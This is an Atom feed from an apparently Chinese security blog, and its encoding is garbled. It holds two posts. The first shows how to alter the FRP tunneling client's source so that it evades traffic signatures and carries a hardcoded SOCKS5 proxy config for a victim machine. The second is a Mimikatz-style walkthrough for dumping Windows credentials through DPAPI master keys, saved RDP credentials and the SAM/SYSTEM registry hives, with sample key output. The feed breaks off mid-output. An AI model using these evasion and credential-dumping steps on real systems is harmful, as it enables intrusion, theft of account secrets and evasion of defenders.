<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ascotbe</title>
  
  
  <link href="https://www.ascotbe.com/atom.xml" rel="self"/>
  
  <link href="https://www.ascotbe.com/"/>
  <updated>2021-07-09T01:39:17.044Z</updated>
  <id>https://www.ascotbe.com/</id>
  
  <author>
    <name>ascotbe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å¸¸è§å·¥å…·ç‰¹å¾å»é™¤</title>
    <link href="https://www.ascotbe.com/2021/07/07/FrequentToolCharacteristics/"/>
    <id>https://www.ascotbe.com/2021/07/07/FrequentToolCharacteristics/</id>
    <published>2021-07-07T15:07:46.000Z</published>
    <updated>2021-07-09T01:39:17.044Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><h2 id="FRPæ”¹é€ "><a href="#FRPæ”¹é€ " class="headerlink" title="FRPæ”¹é€ "></a>FRPæ”¹é€ </h2><blockquote><h3 id="æ”¹é€ ä¹‹å‰"><a href="#æ”¹é€ ä¹‹å‰" class="headerlink" title="æ”¹é€ ä¹‹å‰"></a>æ”¹é€ ä¹‹å‰</h3></blockquote><p>![image-20210707150953360](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210707150953360.png)</p><p>åœ¨å—å®³è€…æœºå™¨ä¸Šä½¿ç”¨<code>frpc.exe -c frpc_socker.ini</code>è¿æ¥æœåŠ¡èµ·çš„æ—¶å€™ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªè¿™ç§æ•°æ®æ ¡æ£€</p><blockquote><h3 id="æµé‡æ”¹é€ "><a href="#æµé‡æ”¹é€ " class="headerlink" title="æµé‡æ”¹é€ "></a>æµé‡æ”¹é€ </h3></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg\msg\msg.go</span><br></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªå‡½æ•°ä¸­ä¿å­˜ç€ä¸Šé¢çš„ä¿¡æ¯</p><p>![image-20210707151346655](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210707151346655.png)</p><p>æˆ‘åœ¨å‰åŠ ä¸ªäº†å‰ç¼€</p><p>![image-20210708142818186](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210708142818186.png)</p><p>è€Œåœ¨<code>pkg\util\version\version.go</code> ä¸­å®šä¹‰äº†ç‰ˆæœ¬ä¿¡æ¯ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä¿®æ”¹ä¸€ä¸‹</p><p>![image-20210707153734705](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210707153734705.png)</p><p>æ”¹æˆéšä¾¿ä¸€ä¸ªç‰ˆæœ¬</p><p>![image-20210708142835960](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210708142835960.png)</p><p>ç»“æœå¦‚ä¸‹</p><p>![image-20210708145449323](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210708145449323.png)</p><blockquote><h3 id="ç¼–è¯‘æ–¹å¼"><a href="#ç¼–è¯‘æ–¹å¼" class="headerlink" title="ç¼–è¯‘æ–¹å¼"></a>ç¼–è¯‘æ–¹å¼</h3></blockquote><p>é¦–å…ˆæ‰§è¡Œ<code>make</code>ä¼šè¿›è¡Œä¸€äº›GitHubçš„åŒ…ä¸‹è½½ï¼ˆæœ€å¥½ä½¿ç”¨ä»£ç†</p><p>æ¥ç€æ‰§è¡Œ<code>make -f Makefile.cross-compiles</code>è¿›è¡Œç¼–è¯‘</p><p>![image-20210708143346779](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210708143346779.png)</p><blockquote><h3 id="é…ç½®æ–‡ä»¶æ”¹é€ "><a href="#é…ç½®æ–‡ä»¶æ”¹é€ " class="headerlink" title="é…ç½®æ–‡ä»¶æ”¹é€ "></a>é…ç½®æ–‡ä»¶æ”¹é€ </h3></blockquote><p>å…¨ç§°åªéœ€è¦ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶<code>cmd/frpc/sub/root.go</code></p><p>å…ˆä¿®æ”¹varä½ç½®ï¼Œæ·»åŠ ipã€portã€fileContentè¿™ä¸‰ä¸ªå‚æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">cfgFile     <span class="keyword">string</span></span><br><span class="line">showVersion <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">serverAddr        <span class="keyword">string</span></span><br><span class="line">user              <span class="keyword">string</span></span><br><span class="line">protocol          <span class="keyword">string</span></span><br><span class="line">token             <span class="keyword">string</span></span><br><span class="line">logLevel          <span class="keyword">string</span></span><br><span class="line">logFile           <span class="keyword">string</span></span><br><span class="line">logMaxDays        <span class="keyword">int</span></span><br><span class="line">disableLogColor   <span class="keyword">bool</span></span><br><span class="line">ip                <span class="keyword">string</span></span><br><span class="line">port              <span class="keyword">string</span></span><br><span class="line">fileContent       <span class="keyword">string</span></span><br><span class="line">proxyName         <span class="keyword">string</span></span><br><span class="line">localIp           <span class="keyword">string</span></span><br><span class="line">localPort         <span class="keyword">int</span></span><br><span class="line">remotePort        <span class="keyword">int</span></span><br><span class="line">useEncryption     <span class="keyword">bool</span></span><br><span class="line">useCompression    <span class="keyword">bool</span></span><br><span class="line">customDomains     <span class="keyword">string</span></span><br><span class="line">subDomain         <span class="keyword">string</span></span><br><span class="line">httpUser          <span class="keyword">string</span></span><br><span class="line">httpPwd           <span class="keyword">string</span></span><br><span class="line">locations         <span class="keyword">string</span></span><br><span class="line">hostHeaderRewrite <span class="keyword">string</span></span><br><span class="line">role              <span class="keyword">string</span></span><br><span class="line">sk                <span class="keyword">string</span></span><br><span class="line">multiplexer       <span class="keyword">string</span></span><br><span class="line">serverName        <span class="keyword">string</span></span><br><span class="line">bindAddr          <span class="keyword">string</span></span><br><span class="line">bindPort          <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">kcpDoneCh <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>å†ä¿®æ”¹ä¼ å‚ä½ç½®</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, <span class="string">&quot;config&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;./frpc.ini&quot;</span>, <span class="string">&quot;config file of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, <span class="string">&quot;version&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;version of frpc&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;ip, <span class="string">&quot;server_addr&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_addr&quot;</span>)</span><br><span class="line">rootCmd.PersistentFlags().StringVarP(&amp;port, <span class="string">&quot;server_port&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;server_port&quot;</span>)</span><br><span class="line">kcpDoneCh = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åè‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ip <span class="keyword">string</span>, port <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="keyword">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">    tls_enable = true</span></span><br><span class="line"><span class="string">token = china_nb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[plugin_socks5]</span></span><br><span class="line"><span class="string">type = tcp</span></span><br><span class="line"><span class="string">remote_port = 12345</span></span><br><span class="line"><span class="string">plugin = socks5</span></span><br><span class="line"><span class="string">plugin_user = admin</span></span><br><span class="line"><span class="string">plugin_passwd = admin</span></span><br><span class="line"><span class="string">use_encryption = true </span></span><br><span class="line"><span class="string">use_compression = true</span></span><br><span class="line"><span class="string">    `</span></span><br><span class="line">fileContent = content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>runClient</code>å‡½æ•°    </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">runClient</span><span class="params">(cfgFilePath <span class="keyword">string</span>,ip <span class="keyword">string</span>,port <span class="keyword">string</span>)</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> content <span class="keyword">string</span></span><br><span class="line">getFileContent(ip,port)</span><br><span class="line"><span class="comment">//scontent, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line">content, err = fileContent, <span class="literal">nil</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€årunClient()å‡½æ•°ä¸‹è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„å‡½æ•°getFileContent()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rootCmd = &amp;cobra.Command&#123;</span><br><span class="line">Use:   <span class="string">&quot;frpc&quot;</span>,</span><br><span class="line">Short: <span class="string">&quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;</span>,</span><br><span class="line">RunE: <span class="function"><span class="keyword">func</span><span class="params">(cmd *cobra.Command, args []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> showVersion &#123;</span><br><span class="line">fmt.Println(version.Full())</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Do not show command usage here.</span></span><br><span class="line">err := runClient(cfgFile,ip,port)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸç»“æœ</p><p>![image-20210708165905688](/Users/ascotbe/Library/Application Support/typora-user-images/image-20210708165905688.png)</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;chowdera.com&#x2F;2021&#x2F;03&#x2F;20210311155239092N.html</span><br><span class="line">https:&#x2F;&#x2F;uknowsec.cn&#x2F;posts&#x2F;notes&#x2F;FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windowsæœ¬åœ°å¯†ç æŠ“å–</title>
    <link href="https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/"/>
    <id>https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/</id>
    <published>2021-06-09T15:45:42.000Z</published>
    <updated>2021-07-07T06:02:55.824Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>å­¦ï¼åç»­ä¼šæŒç»­æ›´æ–°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/1.png" alt="image-20210611163901510"></p><h2 id="ç³»ç»Ÿå¯†ç "><a href="#ç³»ç»Ÿå¯†ç " class="headerlink" title="ç³»ç»Ÿå¯†ç "></a>ç³»ç»Ÿå¯†ç </h2><h3 id="DPAPIè§£å¯†"><a href="#DPAPIè§£å¯†" class="headerlink" title="DPAPIè§£å¯†"></a>DPAPIè§£å¯†</h3><p>ä½¿ç”¨ç”¨æˆ·ç™»å½•å¯†ç è§£å¯†Master Key fileï¼Œè·å¾—Master Key</p><p>å›ºå®šä½ç½®ï¼š <code>%APPDATA%\Microsoft\Protect\%SID%</code>ä¸‹å¾€å¾€æœ‰å¤šä¸ªMaster Key file</p><p>è¿™æ˜¯ä¸ºäº†å®‰å…¨èµ·è§ï¼Œç³»ç»Ÿæ¯éš”90å¤©ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ–°çš„Master Key(æ—§çš„ä¸ä¼šåˆ é™¤)</p><p><code>%APPDATA%\Microsoft\Protect\%SID%</code>ä¸‹å­˜åœ¨ä¸€ä¸ªå›ºå®šæ–‡ä»¶<code>Preferred</code>ï¼ŒåŒ…å«æœ€åä¸€ä¸ªMaster Key fileçš„åç§°å’Œåˆ›å»ºæ—¶é—´ï¼Œæ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _tagPreferredMasterKey</span><br><span class="line">&#123;</span><br><span class="line">  GUID guidMasterKey;</span><br><span class="line">  FILETIME ftCreated;</span><br><span class="line">&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„æµç¨‹ï¼š</p><ul><li>æ‰¾åˆ°æœ¬æœºçš„Master Key file</li><li>ä»Master Key fileä¸­è·å–åˆ°Master Key</li><li>é€šè¿‡Master Keyè§£å¯†DPAPI blobè·å¾—æ˜æ–‡</li></ul><h3 id="æœ¬åœ°ä¿å­˜RDPå¯†ç "><a href="#æœ¬åœ°ä¿å­˜RDPå¯†ç " class="headerlink" title="æœ¬åœ°ä¿å­˜RDPå¯†ç "></a>æœ¬åœ°ä¿å­˜RDPå¯†ç </h3><p>é¦–å…ˆéœ€è¦æ‰“å¼€<strong>éšè—å—ä¿æŠ¤çš„æ“ä½œç³»ç»Ÿæ–‡ä»¶</strong>ï¼Œä¸æ‰“å¼€çš„è¯å°±ç®—æ‰“å¼€äº†æ˜¾ç¤º<strong>éšè—çš„æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œé©±åŠ¨å™¨</strong>ä¹Ÿæ˜¯çœ‹ä¸åˆ°çš„</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/2.png" alt="image-20210607105330176" style="zoom:50%;" /><p>æ¥ç€æ‰“å¼€æ–‡ä»¶<code>C:\Users\ç”¨æˆ·å\AppData\Local\Microsoft\Credentials</code>å°±å¯ä»¥çœ‹åˆ°ä¿å­˜çš„æ•°æ®äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/3.png" alt="image-20210609134443326"></p><p>ä½¿ç”¨<code>cmdkey /line</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹æœ¬åœ°ä¿å­˜äº†å“ªäº›å¯†ç ï¼Œå¦‚æœä½ è¿è¿‡å…¶ä»–æœåŠ¡å™¨å¦‚æœç‚¹å‡»äº†ä¿å­˜å¯†ç å°±èƒ½æŠ“å–åˆ°</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/4.png" alt="image-20210607105639249"></p><p>ä½¿ç”¨ğŸ¥è¯»å–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred &#x2F;in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSIONID</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/5.png" alt="image-20210608171226583"></p><p>è·å–åˆ°<strong>guidMasterKey</strong>å…¶å®å°±æ˜¯æˆ‘ä»¬çš„master key fileåç§°</p><blockquote><p>åˆ‡è®°ä¸€ç‚¹ä¸åŒçš„SESSIONIDå¦‚æœé—´éš”æ—¶é—´è¶…è¿‡90å¤©é‚£ä¹ˆå¯¹åº”çš„guidMasterKeyä¹Ÿæ˜¯ä¸åŒçš„</p></blockquote><p>é€šè¿‡å‘½ä»¤è·å–åˆ°Master Key fileçš„Master Keyï¼Œä¸‹æ–‡ä¸­<strong>GUID==Master Key file</strong>ï¼Œ<strong>MasterKey==Master Key</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : æ¨±å²›éº»è¡£</span><br><span class="line">Logon Server      : æ¨±å²›éº»è¡£</span><br><span class="line">Logon Time        : 2021&#x2F;6&#x2F;7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;d3fcdbfb-06bd-49f0-98b4-ac08664c176a&#125;</span><br><span class="line">         * Time      :  2021&#x2F;6&#x2F;7 9:37:59</span><br><span class="line">         * MasterKey :  7da666987b2b6a51db3148cd01a6fe460a79315d1678a24b327d251c4f9138eecbb7ca4919de8de678628963761ee731a1316b78a6a982d0d4a9c590f5171c9e</span><br><span class="line">         * sha1(key) :  efd1c9d7290d13b3ecc1e288accfc5d6707d3403</span><br><span class="line">         [00000001]</span><br><span class="line">         * GUID      :  &#123;33449413-8697-4a85-a075-778b49015fbe&#125;</span><br><span class="line">         * Time      :  2021&#x2F;6&#x2F;8 17:17:37</span><br><span class="line">         * MasterKey :  0ac77f164c38e751f303e26d883cd15e3eb3861f2d69c2ba192035511bfc8f2880f206ef238de4d282384c813326feeaef364b9089c86a97a5169f31dbd319ee</span><br><span class="line">         * sha1(key) :  f45701db86a93d9b860be725d7eaf32a9a684a77</span><br><span class="line">         [00000002]</span><br><span class="line">         * GUID      :  &#123;788f0828-1d1e-478d-adf6-7a37e92182e8&#125;</span><br><span class="line">         * Time      :  2021&#x2F;6&#x2F;7 18:01:08</span><br><span class="line">         * MasterKey :  6a9ece2f3bd683c2ac14c69e13465399e9ce20c2930dd51dd9378eed800b06b409f7f4bef926e503d85a0b9e5e1f4cc5ccd01fb2ddaa8de90d086bf3a8ae3bf3</span><br><span class="line">         * sha1(key) :  f2d6c58b2d2f0a91e07dc0d1cb7db7cb8935f955</span><br></pre></td></tr></table></figure><p>åªéœ€è¦ä½¿ç”¨<strong>SESSIONID</strong>å¯¹åº”çš„GUIDå’ŒMasterKeyå°±èƒ½è§£å¯†æ•°æ®äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred &#x2F;in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSION &#x2F;masterkey:å¯¹åº”çš„GUID MasterKey</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/6.png" alt="image-20210609134218324"></p><p><strong>TargetName</strong>æ˜¯ç›®æ ‡æœºå™¨ï¼Œ<strong>UserName</strong>æ˜¯è´¦å·ï¼Œ<strong>CredentialBlob</strong>æ˜¯å¯†ç </p><h3 id="æœ¬æœºå¯†ç "><a href="#æœ¬æœºå¯†ç " class="headerlink" title="æœ¬æœºå¯†ç "></a>æœ¬æœºå¯†ç </h3><h4 id="é€šè¿‡æ³¨å†Œåˆ—è¡¨æŠ“å–å¯†ç "><a href="#é€šè¿‡æ³¨å†Œåˆ—è¡¨æŠ“å–å¯†ç " class="headerlink" title="é€šè¿‡æ³¨å†Œåˆ—è¡¨æŠ“å–å¯†ç "></a>é€šè¿‡æ³¨å†Œåˆ—è¡¨æŠ“å–å¯†ç </h4><p>é¦–å…ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼ŒæŠ“å–æ³¨å†Œåˆ—è¡¨ä¸­ä¿å­˜çš„å“ˆå¸Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ğŸ¥è¿›è¡Œè§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br></pre></td></tr></table></figure><p>è§£å¯†åçš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">ç‰ˆæƒæ‰€æœ‰ (C) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚</span><br><span class="line"></span><br><span class="line">å°è¯•æ–°çš„è·¨å¹³å° PowerShell https:&#x2F;&#x2F;aka.ms&#x2F;pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\ascotbe&gt; cd .\Desktop\</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">æ“ä½œæˆåŠŸå®Œæˆã€‚</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SAM SAM</span><br><span class="line">æ“ä½œæˆåŠŸå®Œæˆã€‚</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; .\x64.exe</span><br><span class="line"></span><br><span class="line">  .#####.   EeLrXMiD 2.2.0 (x64) #19041 Oct 10 2020 14:46:27</span><br><span class="line"> .## ^ ##.  &quot;e2G6OxuvUXNR1&#39;Amour&quot; - (IcaHL)</span><br><span class="line"> ## &#x2F; \ ##  &#x2F;*** ST1KQSnf huXMA &#96;gVhmWw70VD&#96; ( NceCVtrwTckaqiPu3XOVsQl )</span><br><span class="line"> ## \ 